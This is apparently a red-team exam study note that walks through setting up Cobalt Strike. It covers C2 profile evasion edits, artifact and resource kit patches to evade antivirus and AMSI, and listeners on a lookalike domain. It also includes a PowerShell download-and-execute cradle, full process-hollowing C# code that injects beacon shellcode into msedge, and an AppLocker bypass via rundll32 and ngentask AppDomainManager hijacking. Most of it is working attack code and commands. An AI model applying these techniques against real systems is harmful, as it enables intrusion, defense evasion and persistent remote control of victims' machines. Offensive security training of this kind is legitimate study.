# Cobalt Strike Prepare & Beyond  

The objective is to setup Cobalt Strike.  Update Malleable C2 profile, create artifact, resource kit, listeners, load scripts, and disable AppLocker controls for first Beacon.  

* SSH to team server
* Malleable C2 profile Edit (stage + post-ex + process-inject blocks)
* Build **Artifact** Kit →  ThreatCheck + Ghidra clean
* Build **Resource** Kit → fix template.x64.ps1 → ThreatCheck AMSI clean
* Add Cobalt Strike Listeners 
* Load CNA CS Script Manager
* Generate & Host Payloads
* Initial Beacon
  * Enumerate AppLocker Policy
  * Download Beacon DLL to Workstation
  * Execute via rundll32
  * Process Hollowing AppDomainHijack.dll
* Connected Beacon Checklist
* [Post Exploitation Enumeration](/cheatsheets/post-exploitation.md) 🚨  
  * Local Privilege Escalation  
  

### SSH to team server

```bash
ssh attacker@10.0.0.5
# Password: Passw0rd!
cd /opt/cobaltstrike/profiles
nano default.profile
```

## Malleable C2 profile Edit

>Stage Block + Post-ex Block + Process-Inject Block

```c
stage {
    set userwx "false";
    set cleanup "true";
    set copy_pe_header "false";
    set module_x64 "Hydrogen.dll";

    transform-x64 {
        strrep "beacon.x64.dll" "bacon.x64.dll";
        strrep "%02d/%02d/%02d" "%02d/%02d/%04d";
        strrep "%s as %s\\\\%s: %d" "%s - %s\\\\%s: %d";
        strrep "%02d/%02d/%02d %02d:%02d:%02d" "%02d-%02d-%02d %02d:%02d:%02d";
        strrep "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x00\\x80\\x00\\x00" "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x01\\x80\\x00\\x00";
    }
}

post-ex {
    set spawnto_x64 "%windir%\\\\sysnative\\\\werfault.exe";
    set cleanup "true";
    set pipename "dotnet-diagnostic-#####-##########, mojo.####.####.##########, perflib_perfmon_######";
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x2c";
    set amsi_disable "true";

    transform-x64 {
        strrep "This program cannot be run in DOS mode." "This is totally not a PE.";
        strrepex "PowerPick" "CLRCreateInstance failed w/hr 0x%08lx" "CLRCreateInstance failed: 0x%08lx";
        strrepex "PowerPick" "Failed to get default AppDomain w/hr 0x%08lx" "Failed to get default AppDomain: 0x%08lx";
        strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Unhandled exception.";
        strrepex "ExecuteAssembly" "Failed to load the assembly w/hr 0x%08lx" "Failed to load the assembly: 0x%08lx";
    }
}

process-inject {
    set allocator "VirtualAllocEx";
    set bof_allocator "VirtualAlloc";
    set bof_reuse_memory "true";
    set min_alloc "8192";
    set startrwx "false";
    set userwx "false";

    execute {
        CreateThread "ntdll.dll!RtlUserThreadStart+0x2c";
        NtQueueApcThread-s;
        NtQueueApcThread;
        SetThreadContext;
    }
}
```

>Apply and validate Malleable C2 profile updates  

```
sudo /usr/bin/docker restart cobaltstrike-cs-1

sudo /usr/bin/docker logs cobaltstrike-cs-1
```

## Build Artifact Kit

### Patch patch.c in VSCode

>Launch Visual Studio Code 🔵 > File > Open Folder → `C:\Tools\cobaltstrike\arsenal-kit\kits\artifact\` Open `src-common\patch.c`  

```cpp
// line 45 REPLACE WITH (backwards while loop — different compiled bytecode, identical logic):
x = length;
while ( x-- ) {
    * ( ( char * ) buffer + x) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
}

// line 116 REPLACE Decryption loop with 
int x = length;
while ( x-- ) {
    * ( ( char * ) ptr + x ) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
}
```

>Build **artifacts** in WSL 🟣🐧Ubuntu  

```cpp
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact

./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
```

### ThreatCheck & Ghidra  

```powershell
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
```

>Ghidra to locate the flagged code at the offset ThreatCheck give  


## Build Resource Kit  

>Build **resources** templates in WSL 🟣🐧Ubuntu  

```bash
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
```

>Visual Studio Code 🔵 - File > Open Folder → `C:\Tools\cobaltstrike\custom-resources` Open: `template.x64.ps1`  

>Replace System.dll' with obfuscation:  

```powershell
# Before (AMSI-detected):
.Equals('System.dll')

.Equals([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('J1N5cycrJ3RlbS4nKydkbGwnCg==')))
# 'J1N5cycrJ3RlbS4nKydkbGwnCg==' = base64('Sys'+'tem.'+'dll')
```

>Replace `Marshal.Copy` with WriteProcessMemory:  

```powershell
# orginal code detected
    [System.Runtime.InteropServices.Marshal]::Copy($v_code, 0, $var_buffer, $v_code.length)

# replacement obfuscated

$var_ntwvm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (func_get_proc_address ntdll.dll ('NtWrite'+'VirtualMemory')),
    (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([UInt32]))
)
$var_ntwvm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [ref]0) | Out-Null
```

>Visual Studio Code 🔵 - File > Open Folder → `C:\Tools\cobaltstrike\custom-resources` Open: `compress.ps1` with obfuscation  

```powershell
SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
```

>ThreatCheck 🛡️ AMSI  

```powershell
cd C:\Tools\cobaltstrike\custom-resources\
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
```

<img src="/images/threatchecks1.png">  

## Cobalt Strike Listeners  

### Connect to Cobalt Strike

1. On the Windows taskbar, click on the Cobalt Strike icon.
1. Fill in the connection details for the team server.
  1. Host: `10.0.0.5`
  1. Port: `50050`
  1. Password: `Passw0rd!`

### Create Listeners

Go to **Cobalt Strike > Listeners > Add** to create a new listener.

### HTTP Listener

1. Name: `http`
1. Payload: Beacon HTTP
1. HTTP Hosts: `www.bleepincomputer.com`
1. HTTP Host (Stager) : `www.bleepincomputer.com`

<img src="/images/cs_setup1.png">  

### SMB Listener

1. Name: `smb`
1. Payload: Beacon SMB
1. Pipename: `dotnet-diagnostic-6845-636768274066975`  

<img src="/images/cs_setup2.png">  

### TCP Listener

1. Name: `tcp`
1. Payload: Beacon TCP
1. Port: `4444`
1. Bind to localhost: False

<img src="/images/cs_setup3.png">  

### TCP (local) Listener

1. Name: `tcp-local`
1. Payload: Beacon TCP
1. Port: `1337`
1. Bind to localhost: True

<img src="/images/cs_setup4.png">

# Load CNA Scripts  

>Script Manager > Load > CNA Script File 💡 Aggressor Scripts:  

* C:\Tools\cobaltstrike\arsenal-kit\kits\elevate\elevate.cna
* C:\Tools\CS-Situational-Awareness-BOF\SA\SA.cna
* C:\Tools\CS-Remote-OPs-BOF\Remote\Remote.cna
* C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact.cna
* C:\Tools\cobaltstrike\custom-resources\resources.cna
* C:\Tools\Kerbeus-BOF\kerbeus_cs.cna
* C:\Tools\SQL-BOF\SQL\SQL.cna
* C:\Tools\SCShell\CS-BOF\scshell.cna

----  

# Generate & Host Payloads

> ⚠️ **PREREQUISITE — First Update C2 Malleable Profile**  

> First CHECK [Defence evasion Malleable C2 profile](https://github.com/botesjuan/CRTO-Study-Notes/blob/main/labs/defence-evasion-lab-Malleable.md#part-1--malleable-c2-profile)

<img src="/images/malleable-c2-profile-updates.png">  

> Generate payloads will use the custom artifact stubs.  

1. Go to **Payloads > Windows Stageless Generate All Payloads**
2. Folder: `C:\Payloads`
3. Click **Generate**

<img src="/images/generate_payloads.png">  

## Scripted Web Delivery

Host a 64-bit PowerShell payload.  
```
Cobalt Strike > Attacks > Scripted Web Delivery
Select the http listener.
Click Launch.
```

<img src="/images/scripted-web-delivery-http-listener.png">  

>Example given by Cobalt Strike:  

```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://172.16.0.10:80/a'))"
```

## Generate Stageless Beacon DLL  

```
Cobalt Strike > Payloads > Windows Stageless Payload
  Listener:  http
  Output:    Windows DLL (x64)
  Save as:   C:\Payloads\beacon.dll
```

## Host Payload via CS Web Server

```
Site Management > Host File
  File:   C:\Payloads\beacon.dll
  URI:    /beacon.dll
  Port:   80
```

>Example given by Cobalt Strike:  

```
http://172.16.0.10:80/beacon.dll
```

## Generate RAW BIN Beacon shellcode

```
Cobalt Strike >Payloads > Windows Stageless Payload
Listener: http
Output: Raw
Click Generate.
Save to C:\Payloads\http_x64.xprocess.bin
```

### Build AppDomainHijack.dll  

>Visual Studio 2022 > create > `Class Library (.NET Framework)` > Add the shellcode to the project🟡.  
>Add > Existing Item > `C:\Payloads\http_x64.xprocess.bin` and Properties > Set Build Action > `Embedded Resource`  

>Process Hollowing Malware `Class1.cs`:  

```cpp
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
 
namespace AppDomainHijack
{
    public sealed class DomainManager : AppDomainManager
    {
        public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
        {
            var si = new STARTUPINFOA
            {
                cb = (uint)Marshal.SizeOf<STARTUPINFOA>(),
                dwFlags = STARTUPINFO_FLAGS.STARTF_USESHOWWINDOW
            };
 
            // create hidden + suspended msedge process
            var success = CreateProcessA(
                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-startup-window",
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                PROCESS_CREATION_FLAGS.CREATE_NO_WINDOW | PROCESS_CREATION_FLAGS.CREATE_SUSPENDED,
                IntPtr.Zero,
                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\",
                ref si,
                out var pi);
 
            if (!success)
                return;
 
            // get basic process information
            var szPbi = Marshal.SizeOf<PROCESS_BASIC_INFORMATION>();
            var lpPbi = Marshal.AllocHGlobal(szPbi);
 
            NtQueryInformationProcess(
                pi.hProcess,
                PROCESSINFOCLASS.ProcessBasicInformation,
                lpPbi,
                (uint)szPbi,
                out _);
 
            // marshal data to structure
            var pbi = Marshal.PtrToStructure<PROCESS_BASIC_INFORMATION>(lpPbi);
            Marshal.FreeHGlobal(lpPbi);
 
            // calculate pointer to image base address
            var lpImageBaseAddress = pbi.PebBaseAddress + 0x10;
 
            // buffer to hold data, 64-bit addresses are 8 bytes
            var bImageBaseAddress = new byte[8];
 
            // read data from spawned process
            ReadProcessMemory(
                pi.hProcess,
                lpImageBaseAddress,
                bImageBaseAddress,
                8,
                out _);
 
            // convert address bytes to pointer
            var baseAddress = (IntPtr)BitConverter.ToInt64(bImageBaseAddress, 0);
 
            // read pe headers
            var data = new byte[512];
 
            ReadProcessMemory(
                pi.hProcess,
                baseAddress,
                data,
                512,
                out _);
 
            // read e_lfanew
            var e_lfanew = BitConverter.ToInt32(data, 0x3C);
 
            // calculate rva
            var rvaOffset = e_lfanew + 0x28;
            var rva = BitConverter.ToUInt32(data, rvaOffset);
 
            // calculate address of entry point
            var lpEntryPoint = (IntPtr)((UInt64)baseAddress + rva);
 
            // read the shellcode
            byte[] shellcode;
 
            var assembly = Assembly.GetExecutingAssembly();
 
            using (var rs = assembly.GetManifestResourceStream("AppDomainHijack.http_x64.xprocess.bin"))
            {
                // convert stream to raw byte[]
                using (var ms = new MemoryStream())
                {
                    rs.CopyTo(ms);
                    shellcode = ms.ToArray();
                }
            }
 
            // copy shellcode into address of entry point
            WriteProcessMemory(
                pi.hProcess,
                lpEntryPoint,
                shellcode,
                shellcode.Length,
                out _);
 
            // resume process
            ResumeThread(pi.hThread);
        }
 
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true, CharSet = CharSet.Ansi)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern bool CreateProcessA(
            string applicationName,
            string commandLine,
            IntPtr processAttributes,
            IntPtr threadAttributes,
            bool inheritHandles,
            PROCESS_CREATION_FLAGS creationFlags,
            IntPtr environment,
            string currentDirectory,
            ref STARTUPINFOA startupInfo,
            out PROCESS_INFORMATION processInformation);
 
        [DllImport("ntdll.dll", ExactSpelling = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern uint NtQueryInformationProcess(
            IntPtr processHandle,
            PROCESSINFOCLASS processInformationClass,
            IntPtr processInformation,
            uint processInformationLength,
            out uint returnLength);
 
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern bool ReadProcessMemory(
            IntPtr processHandle,
            IntPtr baseAddress,
            byte[] buffer,
            UInt64 size,
            out uint numberOfBytesRead);
 
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern bool WriteProcessMemory(
            IntPtr processHandle,
            IntPtr baseAddress,
            byte[] buffer,
            int size,
            out int numberOfBytesWritten);
 
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern uint ResumeThread(IntPtr threadHandle);
    }
 
    [Flags]
    public enum PROCESS_CREATION_FLAGS : uint
    {
        DEBUG_PROCESS = 0x00000001,
        DEBUG_ONLY_THIS_PROCESS = 0x00000002,
        CREATE_SUSPENDED = 0x00000004,
        DETACHED_PROCESS = 0x00000008,
        CREATE_NEW_CONSOLE = 0x00000010,
        NORMAL_PRIORITY_CLASS = 0x00000020,
        IDLE_PRIORITY_CLASS = 0x00000040,
        HIGH_PRIORITY_CLASS = 0x00000080,
        REALTIME_PRIORITY_CLASS = 0x00000100,
        CREATE_NEW_PROCESS_GROUP = 0x00000200,
        CREATE_UNICODE_ENVIRONMENT = 0x00000400,
        CREATE_SEPARATE_WOW_VDM = 0x00000800,
        CREATE_SHARED_WOW_VDM = 0x00001000,
        CREATE_FORCEDOS = 0x00002000,
        BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
        ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
        INHERIT_PARENT_AFFINITY = 0x00010000,
        INHERIT_CALLER_PRIORITY = 0x00020000,
        CREATE_PROTECTED_PROCESS = 0x00040000,
        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
        PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
        PROCESS_MODE_BACKGROUND_END = 0x00200000,
        CREATE_SECURE_PROCESS = 0x00400000,
        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
        CREATE_DEFAULT_ERROR_MODE = 0x04000000,
        CREATE_NO_WINDOW = 0x08000000,
        PROFILE_USER = 0x10000000,
        PROFILE_KERNEL = 0x20000000,
        PROFILE_SERVER = 0x40000000,
        CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000
    }
 
    public struct STARTUPINFOA
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public STARTUPINFO_FLAGS dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
 
    [Flags]
    public enum STARTUPINFO_FLAGS : uint
    {
        STARTF_FORCEONFEEDBACK = 0x00000040,
        STARTF_FORCEOFFFEEDBACK = 0x00000080,
        STARTF_PREVENTPINNING = 0x00002000,
        STARTF_RUNFULLSCREEN = 0x00000020,
        STARTF_TITLEISAPPID = 0x00001000,
        STARTF_TITLEISLINKNAME = 0x00000800,
        STARTF_UNTRUSTEDSOURCE = 0x00008000,
        STARTF_USECOUNTCHARS = 0x00000008,
        STARTF_USEFILLATTRIBUTE = 0x00000010,
        STARTF_USEHOTKEY = 0x00000200,
        STARTF_USEPOSITION = 0x00000004,
        STARTF_USESHOWWINDOW = 0x00000001,
        STARTF_USESIZE = 0x00000002,
        STARTF_USESTDHANDLES = 0x00000100
    }
 
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }
 
    public enum PROCESSINFOCLASS
    {
        ProcessBasicInformation = 0
    }
 
    public struct PROCESS_BASIC_INFORMATION
    {
        public uint ExitStatus;
        public IntPtr PebBaseAddress;
        public ulong AffinityMask;
        public int BasePriority;
        public ulong UniqueProcessId;
        public ulong InheritedFromUniqueProcessId;
    }
}
```

>Build release version `C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dll`  
⚠️ Process Hollowing ⚠️ Above is the process hollowing code from Malware Essentials chapter.  

## ThreatCheck AppDomainHijack.dll  

```
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dll"
```

>If ThreatCheck not clean check with Ghidra!  
>If ThreatCheck clean copy for hosting:  

```
cp C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dll C:\Payloads\
```

# Initial Beacon

>On compromised 🖥️ workstation 💻  

## Enumerate AppLocker Policy

>Initial Access, Provided credentials, Locally logged onto compromised 🖥️ workstation 💻  

```powershell
# Confirm AppLocker is enforcing (ConstrainedLanguage = active)
$ExecutionContext.SessionState.LanguageMode

# Read all effective rules
$policy = Get-AppLockerPolicy -Effective
$policy.RuleCollections

# Check if DLL rules are enforced — empty output = DLL rules OFF = rundll32 viable 💡
$policy.RuleCollections | Where-Object { $_.RuleCollectionType -eq 'Dll' }

# Find writable dirs inside the allowed %WINDIR%\* path
icacls C:\Windows\Tasks

icacls C:\Windows\Temp
```

>🚨once bypass path method found to avoid AppLocker proceed to download beacon payload 🚨  

## Download Beacon DLL to Workstation

>On `lon-wkstn-1` as `pchilds` — `Invoke-WebRequest` works in ConstrainedLanguage:  

```powershell
cd C:\Windows\Tasks\
Invoke-WebRequest -Uri 'http://www.bleepincomputer.com/beacon.dll' -OutFile 'C:\Windows\Tasks\beacon.dll'
```

## Execute via rundll32

```cmd
rundll32.exe C:\Windows\Tasks\beacon.dll,StartW
```

>Initial Beacon connect to cobalt strike  

<img src="/images/applocker-challenge02.png" width=860>  


## Process Hollowing 🧨 AppDomainHijack.dll  

>Assume-breach with initial low privilege user beacon💻.  
>No phishing needed OPSEC-🟢SAFE  


### Upload AppDomainHijack.dll  

>beacon>   

```
upload C:\Payloads\AppDomainHijack.dll
```

### Use AppDomainHijack.dll & ngentask Execute  

>On compromised 🖥️ workstation 💻   

```powershell
# On foothold workstation — set APPDOMAIN env vars and run ngentask (OPSEC-🟢SAFE)

cd C:\Windows\Tasks\
ls

cp C:\Windows\WinSxS\amd64_netfx4-ngentask_exe_b03f5f7f11d50a3a_4.0.15805.0_none_d4039dd5692796db\ngentask.exe C:\Windows\Tasks\

$env:APPDOMAIN_MANAGER_TYPE = 'AppDomainHijack.DomainManager'
$env:APPDOMAIN_MANAGER_ASM  = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'

.\ngentask.exe
# Beacon appears from msedge.exe
```

----  

# Connected Beacon Checklist  

>[Initial Access without phishing in exam](/labs/Initial-Access-lab.md) beacon commands:  
* ppid set to explorer.exe PID before `spawnto` and before `execute-assembly` or `powerpick`  
* `spawnto x64 %windir%\sysnative\werfault.exe` before using fork&run operations `execute-assembly`, `powerpick`  

```cs
sleep 3 20                                      // reduce check-in noise
ps                                              // get process list
process_browser                                 // Microsoft Defender/CrowdStrike/SentinelOne/Carbon Black processes → 🔴UNSAFE
ls / pwd / drives                               // file system context

ppid <explorer.exe PID>                         // spoof parent — see note below
spawnto x64 %windir%\sysnative\werfault.exe     // override default rundll32

getuid                                          // confirm user context
netstat                                         // other network connections 
```

----  

# Post Exploitation Enumeration 🔍 

>[Post Exploitation Checks🚨](/cheatsheets/post-exploitation.md)  

>Enumeration commands to execute on workstation
>Find 🕵️ local privilege, sessions, users, escalation, before moving to domain enumeration.  

## Local Privilege Escalation 🔥 

>[Privilege Escalation via WMI subscription or weak service registry permissions to SYSTEM Beacon](/labs/Privilege-Escalation-lab.md)  
* Weak service registry (powerpick — 🟢SAFE, no spawn)  
* steal_token from an existing SYSTEM process (🟢SAFE)  

